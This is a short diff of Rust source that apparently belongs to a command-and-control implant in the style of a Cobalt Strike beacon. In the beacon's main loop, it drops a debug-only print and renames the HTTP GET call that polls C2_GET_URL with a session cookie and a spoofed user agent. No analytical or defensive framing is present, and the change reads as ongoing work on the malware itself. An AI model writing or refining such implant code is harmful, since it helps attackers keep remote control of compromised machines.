@@ -43,12 +43,7 @@ fn main() {
     }
 
     loop {
-        // 仅在 debug 模式下打印
-        if cfg!(debug_assertions) {
-            println!("C2 GET URL");
-        }
-
-        let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
+        let http_res = Strike::get_request(C2_GET_URL, &cookie, USER_AGENT);
         if let Ok(res) = http_res {
             let content_length = res.content_length().unwrap_or(0) as usize;
 
